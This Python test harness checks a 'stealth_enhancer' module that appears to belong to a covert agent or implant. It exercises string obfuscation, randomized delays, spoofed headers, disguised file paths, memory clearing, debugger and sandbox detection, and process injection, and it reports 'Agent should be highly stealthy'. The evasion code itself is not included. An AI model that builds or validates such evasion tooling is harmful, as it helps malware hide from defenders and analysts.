#!/usr/bin/env python3
"""
Comprehensive Stealth Test - Verify all stealth features
"""

import sys
import time
import random

def test_stealth_import():
    """Test stealth enhancer import."""
    print("Testing stealth enhancer import...")
    
    try:
        import stealth_enhancer
        print("✅ Stealth enhancer imported successfully")
        return True
    except Exception as e:
        print(f"❌ Stealth enhancer import failed: {e}")
        return False

def test_stealth_initialization():
    """Test stealth initialization."""
    print("\nTesting stealth initialization...")
    
    try:
        from stealth_enhancer import initialize_advanced_stealth, check_stealth_status
        
        # Test initialization
        init_result = initialize_advanced_stealth()
        print(f"✅ Stealth initialization: {init_result}")
        
        # Test status check
        status = check_stealth_status()
        print(f"✅ Stealth status: {status}")
        
        return init_result and status
    except Exception as e:
        print(f"❌ Stealth initialization failed: {e}")
        return False

def test_obfuscation():
    """Test string obfuscation."""
    print("\nTesting string obfuscation...")
    
    try:
        from stealth_enhancer import encrypt_data, decrypt_data
        
        # Test string encryption
        test_string = "admin"
        encrypted = encrypt_data(test_string)
        decrypted = decrypt_data(encrypted)
        
        print(f"✅ Original: {test_string}")
        print(f"✅ Encrypted: {encrypted}")
        print(f"✅ Decrypted: {decrypted}")
        
        if decrypted == test_string:
            print("✅ String obfuscation working correctly")
            return True
        else:
            print("❌ String obfuscation failed")
            return False
    except Exception as e:
        print(f"❌ String obfuscation test failed: {e}")
        return False

def test_stealth_delays():
    """Test stealth delays."""
    print("\nTesting stealth delays...")
    
    try:
        from stealth_enhancer import stealth_delay
        
        start_time = time.time()
        stealth_delay()
        end_time = time.time()
        
        delay_time = end_time - start_time
        print(f"✅ Stealth delay: {delay_time:.2f} seconds")
        
        if 0.1 <= delay_time <= 5.0:
            print("✅ Stealth delays working correctly")
            return True
        else:
            print("❌ Stealth delays out of range")
            return False
    except Exception as e:
        print(f"❌ Stealth delays test failed: {e}")
        return False

def test_stealth_headers():
    """Test stealth headers."""
    print("\nTesting stealth headers...")
    
    try:
        from stealth_enhancer import get_stealth_headers
        
        headers = get_stealth_headers()
        print(f"✅ Stealth headers: {headers}")
        
        required_headers = ['User-Agent', 'Accept', 'Accept-Language', 'Accept-Encoding', 'Connection']
        for header in required_headers:
            if header in headers:
                print(f"✅ {header}: {headers[header]}")
            else:
                print(f"❌ Missing header: {header}")
                return False
        
        print("✅ Stealth headers working correctly")
        return True
    except Exception as e:
        print(f"❌ Stealth headers test failed: {e}")
        return False

def test_stealth_paths():
    """Test stealth paths."""
    print("\nTesting stealth paths...")
    
    try:
        from stealth_enhancer import stealth_controller
        
        path = stealth_controller.get_stealth_path()
        filename = stealth_controller.get_stealth_filename()
        
        print(f"✅ Stealth path: {path}")
        print(f"✅ Stealth filename: {filename}")
        
        if path and filename:
            print("✅ Stealth paths working correctly")
            return True
        else:
            print("❌ Stealth paths failed")
            return False
    except Exception as e:
        print(f"❌ Stealth paths test failed: {e}")
        return False

def test_memory_clearing():
    """Test memory clearing."""
    print("\nTesting memory clearing...")
    
    try:
        from stealth_enhancer import clear_memory
        
        # Create some test data
        test_data = {"sensitive": "data", "key": "value"}
        print(f"✅ Test data created: {test_data}")
        
        # Clear memory
        clear_memory()
        print("✅ Memory cleared")
        
        print("✅ Memory clearing working correctly")
        return True
    except Exception as e:
        print(f"❌ Memory clearing test failed: {e}")
        return False

def test_anti_analysis():
    """Test anti-analysis detection."""
    print("\nTesting anti-analysis detection...")
    
    try:
        from stealth_enhancer import AntiAnalysis
        
        anti_analysis = AntiAnalysis()
        
        # Test analysis environment detection
        analysis_detected = anti_analysis.check_analysis_environment()
        print(f"✅ Analysis environment detected: {analysis_detected}")
        
        # Test debugger detection
        debugger_detected = anti_analysis.check_debugger()
        print(f"✅ Debugger detected: {debugger_detected}")
        
        # Test sandbox detection
        sandbox_detected = anti_analysis.check_sandbox()
        print(f"✅ Sandbox detected: {sandbox_detected}")
        
        print("✅ Anti-analysis detection working correctly")
        return True
    except Exception as e:
        print(f"❌ Anti-analysis test failed: {e}")
        return False

def test_process_injection():
    """Test process injection capabilities."""
    print("\nTesting process injection capabilities...")
    
    try:
        from stealth_enhancer import ProcessInjection
        
        # Test legitimate process detection
        legitimate_pid = ProcessInjection.inject_into_legitimate_process()
        print(f"✅ Legitimate process PID: {legitimate_pid}")
        
        # Test suspended process creation
        suspended_pid = ProcessInjection.create_suspended_process()
        print(f"✅ Suspended process PID: {suspended_pid}")
        
        print("✅ Process injection capabilities working correctly")
        return True
    except Exception as e:
        print(f"❌ Process injection test failed: {e}")
        return False

def test_stealth_integration():
    """Test stealth integration with main module."""
    print("\nTesting stealth integration with main module...")
    
    try:
        import main
        
        # Check if stealth is available in main
        if hasattr(main, 'STEALTH_AVAILABLE'):
            print(f"✅ STEALTH_AVAILABLE: {main.STEALTH_AVAILABLE}")
        else:
            print("❌ STEALTH_AVAILABLE not found in main")
            return False
        
        # Check if stealth functions are available
        stealth_functions = [
            'initialize_advanced_stealth',
            'encrypt_data',
            'decrypt_data',
            'stealth_delay',
            'clear_memory',
            'check_stealth_status'
        ]
        
        for func in stealth_functions:
            if hasattr(main, func):
                print(f"✅ {func}: Available")
            else:
                print(f"❌ {func}: Not available")
                return False
        
        print("✅ Stealth integration working correctly")
        return True
    except Exception as e:
        print(f"❌ Stealth integration test failed: {e}")
        return False

def main():
    """Run all stealth tests."""
    print("=" * 80)
    print("COMPREHENSIVE STEALTH TEST")
    print("=" * 80)
    
    tests = [
        ("Stealth Import", test_stealth_import),
        ("Stealth Initialization", test_stealth_initialization),
        ("String Obfuscation", test_obfuscation),
        ("Stealth Delays", test_stealth_delays),
        ("Stealth Headers", test_stealth_headers),
        ("Stealth Paths", test_stealth_paths),
        ("Memory Clearing", test_memory_clearing),
        ("Anti-Analysis Detection", test_anti_analysis),
        ("Process Injection", test_process_injection),
        ("Stealth Integration", test_stealth_integration),
    ]
    
    passed = 0
    total = len(tests)
    
    for test_name, test_func in tests:
        print(f"\n{'='*20} {test_name} {'='*20}")
        try:
            if test_func():
                passed += 1
                print(f"✅ {test_name} passed")
            else:
                print(f"❌ {test_name} failed")
        except Exception as e:
            print(f"❌ {test_name} failed with exception: {e}")
    
    print("\n" + "=" * 80)
    print(f"STEALTH TEST RESULTS: {passed}/{total} tests passed")
    print("=" * 80)
    
    if passed == total:
        print("🎉 ALL STEALTH TESTS PASSED!")
        print("✅ Stealth enhancer is working perfectly")
        print("✅ All evasion techniques are functional")
        print("✅ Anti-detection capabilities are active")
        print("✅ Agent should be highly stealthy")
    else:
        print("⚠️ Some stealth tests failed")
        print("🔧 Review failed tests above")
    
    # Calculate stealth rating
    stealth_rating = (passed / total) * 10
    print(f"\n🏆 Overall Stealth Rating: {stealth_rating:.1f}/10")
    
    if stealth_rating >= 9.0:
        print("⭐ EXCELLENT stealth capabilities")
    elif stealth_rating >= 7.0:
        print("⭐ GOOD stealth capabilities")
    elif stealth_rating >= 5.0:
        print("⭐ MODERATE stealth capabilities")
    else:
        print("⭐ POOR stealth capabilities")
    
    return passed == total

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)